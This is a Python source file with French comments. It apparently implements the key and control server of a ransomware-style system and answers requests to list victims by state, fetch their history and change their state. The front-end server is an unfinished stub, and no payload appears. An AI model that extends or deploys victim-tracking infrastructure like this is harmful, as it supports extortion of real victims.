import threading
import queue
import utile.data as data
import utile.message as message
import utile.network as net


# Lancement du serveur clé écoutant (de base) en local sur le port 8380
def Console_Controle(FIFO):
    while True:
        socket = net.start_net_serv_client()
        # Reception d'un message
        recv_data = net.receive_message(socket)

        # Vérification de l'identité du message
        message_type = message.get_message_type(recv_data)

        if message_type == 'LIST_VICTIM_REQ':
            # execution de la fonction get_victim_list() pour plus d'informations -> voir data.py
            result_pending, result_protected, result_other = data.get_victim_list()
            # Pour chaque victime, l'envoie vers le client
            for victim in result_pending:
                list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
                net.send_message(socket, list_victim_resp)

            for victim in result_protected:
                list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
                net.send_message(socket, list_victim_resp)

            for victim in result_other:
                list_victim_resp = message.set_message("LIST_VICTIM_RESP", victim)
                net.send_message(socket, list_victim_resp)

            # envoie d'un LIST_VICTIM_END pour indiquer la fin
            net.send_message(socket, message.set_message("LIST_VICTIM_END"))

        elif message_type == 'HISTORY_REQ':
            # Execution de la fonction get_history() pour plus d'informations -> voir data.py
            result = data.get_history(recv_data)
            # Envoi du résultat
            net.send_message(socket, message.set_message('HISTORY_RESP', result[0]))
            packet = message.set_message('HISTORY_END', [recv_data['HIST_REQ']])
            net.send_message(socket, packet)


        elif message_type == 'CHANGE_STATE':
            data.change_state(recv_data)

def Serveur_Frontal(FIFO):
    while True:
        socket = net.start_net_serv_client(port=8381)



def main():
    FIFO = queue.Queue()
    # création des threads
    Serveur_Frontal_thread = threading.Thread(target=Serveur_Frontal, daemon=True, args=(FIFO,))
    Console_Controle_thread = threading.Thread(target=Console_Controle, daemon=True, args=(FIFO,))
    # Lancement des threads
    Console_Controle_thread.start()
    Serveur_Frontal_thread.start()

    Serveur_Frontal_thread.join()
    print('serveur Frontal fini')

    Console_Controle_thread.join()
    print('console de contrôle fini')


if __name__ == '__main__':
    main()
